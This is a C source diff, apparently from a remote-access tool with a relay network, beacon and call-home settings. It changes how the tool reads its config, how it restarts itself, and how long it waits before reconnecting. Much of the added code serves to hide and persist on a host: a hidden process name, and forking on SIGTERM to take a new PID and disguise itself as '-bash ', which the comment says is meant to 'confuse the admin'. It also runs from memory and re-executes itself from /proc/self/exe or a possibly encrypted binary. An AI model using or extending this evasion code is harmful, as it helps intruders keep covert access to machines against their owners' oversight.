@@ -208,7 +208,7 @@ GSNC_config_read(const char *fn) {
         gopt.gs_workdir = strdup(c.workdir);
     if (c.bail[0] != '\0')
         gopt.bail_cmd = strdup(c.bail);
-    if (c.proc_hiddenname[0] != '\0')
+    if ((gopt.proc_hiddenname == NULL) && (c.proc_hiddenname[0] != '\0'))
         gopt.proc_hiddenname = strdup(c.proc_hiddenname);
     if (c.systemd_argv_match[0] != '\0')
         systemd_argv_match = strdup(c.systemd_argv_match);
@@ -222,12 +222,14 @@ GSNC_config_read(const char *fn) {
     gopt.flags |= (c.flags & GSC_FL_OPT_DAEMON);
     gopt.flags |= (c.flags & GSC_FL_OPT_WATCHDOG_INTERNAL);
     gopt.flags |= (c.flags & GSC_FL_OPT_QUIET);
-    gopt.flags |= (c.flags & GSC_FL_FFPID);
+    if (GS_getenv("GS_NOFFPID") == NULL)
+        gopt.flags |= (c.flags & GSC_FL_FFPID);
     gopt.flags |= (c.flags & GSC_FL_CHANGE_CGROUP);
     gopt.flags |= (c.flags & GSC_FL_DELME);
     gopt.flags |= (c.flags & GSC_FL_USEHOSTID);
     gopt.flags |= (c.flags & GSC_FL_REEXEC);
-    gopt.flags |= (c.flags & GSC_FL_MEMEXEC);
+    if (GS_getenv("GS_NOMEMEXEC") == NULL)
+        gopt.flags |= (c.flags & GSC_FL_MEMEXEC);
 
     // Implied:
     gopt.is_interactive = 1;
@@ -244,6 +246,33 @@ err:
     return ret;
 }
 
+int
+GSNC_config_read_any(const char *argv0) {
+    int ret;
+    char *ptr;
+
+    if (GSNC_config_read(GS_GETENV2("CONFIG_READ")) == 0)
+        return 0;
+
+    if (GSNC_config_read("/proc/self/exe") == 0)
+        return 0;
+
+    if ((ptr = realpath("/proc/self/exe", NULL /* with malloc */)) != NULL) {
+        ret = GSNC_config_read(ptr);
+        free(ptr);
+        if (ret == 0)
+            return 0;
+    }
+
+    if ((ptr = realpath(argv0, NULL /* with malloc */)) != NULL) {
+        ret = GSNC_config_read(ptr);
+        free(ptr);
+        if (ret == 0)
+            return 0;
+    }
+
+    return -1;
+}
 
 #if defined(HAVE_SCHED_H) && defined(__linux__)
 # define WITH_FFPID  (1)
@@ -551,7 +580,6 @@ done:
 	return strdup(str);
 }
 
-
 struct _self_wd {
 	int last_sec;
 	int n_force_exit;
@@ -573,17 +601,46 @@ SWD_reexec(void) {
 	if (!(gopt.flags & GSC_FL_IS_SERVER))
         return;
 
+    // SWD needs these variables. The config or exec-binary may no longer exist.
+    // Three cases to consider:
+    // 1. GS_ARGS was used (and no config is available).
+    // 2. Option -s was used (and no config is available).
+    // 3. The original binary has vanished (config no longer available).
+    if (gopt.flags & GSC_FL_OPT_DAEMON)
+        snprintf(swd.buf, sizeof swd.buf, "-s %s -ilD", gopt.sec_str);
+    else
+        snprintf(swd.buf, sizeof swd.buf, "-s %s -il", gopt.sec_str);
+    setenv("GS_ARGS", swd.buf, 1);
+
+    if (gopt.gs_host)
+        setenv("GS_HOST", gopt.gs_host, 1);
+
+    if (gopt.gs_port > 0) {
+        snprintf(swd.buf, sizeof swd.buf, "%d", gopt.gs_port);
+        setenv("GS_PORT", swd.buf, 1);
+    }
+
+    if (gopt.callhome_sec > 0) {
+        snprintf(swd.buf, sizeof swd.buf, "%d", gopt.callhome_sec / 60);
+        setenv("GS_BEACON", swd.buf, 1);
+    }
+
     swd.n_force_exit += 1;
     snprintf(swd.buf, sizeof swd.buf, "%d:%d:%d", swd.last_sec, swd.n_force_exit, gopt.exit_code);
     setenv("_GS_SWD", swd.buf, 1);
 
-    swd.argv[0] = gopt.proc_hiddenname?:GSNC_PROC_HN_SIGTERM;
+    swd.argv[0] = NULL;
     if (gopt.exit_code == EX_SIGTERM) {
-        // Confuse the admin: change PID on SIGTERM and argv0 to '-bash '.
+        // Confuse the admin: On -TERM, fork to change PID and argv0 to '-bash '.
         if (fork() > 0)
             _exit(0); // do not call cb_atexit().
         swd.argv[0] = GSNC_PROC_HN_SIGTERM;
     }
+    if (swd.argv[0] == NULL)
+        swd.argv[0] = gopt.proc_hiddenname?:GSNC_PROC_HN_SIGTERM;
+
+    setenv("GS_PROC_HIDDENNAME", swd.argv[0], 1);
+    setenv("GS_NOFFPID", "1", 1);
 
     // Close ALL fds:
     gopt.err_fp = NULL;
@@ -592,13 +649,22 @@ SWD_reexec(void) {
     for (int i = 0; i < max; i++)
 		close(i);
 
+    if (gopt.prg_exename)
+        setenv("_GS_FS_EXENAME", gopt.prg_exename, 1);
+    setenv("_GS_REEXEC_DONE", "1", 1); // Will skip the re-exec in init_defaults1
+    execv("/proc/self/exe", swd.argv);
+    DEBUGF("execv(/proc/self/exe): %s\n", strerror(errno));
+
+    // HERE: Could not execute /proc/self/exe. Try executeable from filesystem (might be bincrypted):
+
+    // In this case, we must re-execute to change our argv0 because we don't want
+    // /proc/self/exe to point to our binary on filesystem.
+    unsetenv("_GS_REEXEC_DONE");
     if (gopt.prg_exename) {
         execv(gopt.prg_exename, swd.argv);
         DEBUGF("execv(): %s\n", strerror(errno));
     }
     
-    execv("/proc/self/exe", swd.argv);
-    DEBUGF("execv(/proc/self/exe): %s\n", strerror(errno));
     // FATAL: We failed to watchdog/restart ourselves.
     // caller (cb_exit/cb_sigsegv) will exit() hard for us.
 	return;
@@ -619,7 +685,8 @@ SWD_wait(void) {
     swd.last_sec = gopt.tv_now.tv_sec;
 
     // <seconds:n_force_times> 
-    if ((ptr = getenv("_GS_SWD")) == NULL)
+    ptr = gopt.swd_str;
+    if (ptr == NULL)
         return;
 
     if ((ptr2 = strchr(ptr, ':')) == NULL)
@@ -637,6 +704,7 @@ SWD_wait(void) {
     swd.n_force_exit = atoi(ptr2);
     ec = atoi(ptr3);
 
+    XFREE(gopt.swd_str);
     gettimeofday(&gopt.tv_now, NULL);
     int diff = gopt.tv_now.tv_sec - last_sec;
     int n = 3 * 60;
@@ -645,19 +713,25 @@ SWD_wait(void) {
         // before it receives a BAD-AUTH. At least > 240+10 seconds shall pass before connecting
         // without sleep.
         swd.n_force_exit = 0;
-        n = 0;
+        n = 10;
+    }
+    if (last_sec == 0) {
+        // First reexec by SWD. No previous timestamp.
+        swd.n_force_exit = 0;
+        n = 60;
     }
 
     if (ec == EX_BAD_AUTH) {
         if (swd.n_force_exit == 1) {
             // Note: Host reboot may cause the FIN/RST to be lost. GSNC will think that the old GSNC is still
             // connected until GSRN_MSG_TIMEOUT. First wait for 7 seconds, then longer.
-            n = GSRN_TOKEN_LINGER_SEC + 3; // If BAD-AUTH then only wait long enough for GSRN to drop auth token (7 seconds)
+            n = GSRN_TOKEN_LINGER_SEC + 30; // If BAD-AUTH then only wait long enough for GSRN to drop auth token (7 seconds)
         } else if (swd.n_force_exit > 1) {
-            n = GSRN_DEFAULT_PING_INTERVAL + 10;
+            n = GSRN_DEFAULT_PING_INTERVAL + 20;
         }
     } else {
         swd.n_force_exit = 0;
+        n = 60; // Wait at least 60 seconds for any restart (e.g. -SEGV) before connecting again.
         if (ec == EX_SIGTERM) {
             n = GS_SIGTERM_START_DELAY; // on SIGTERM always wait before re-connecting.
         }
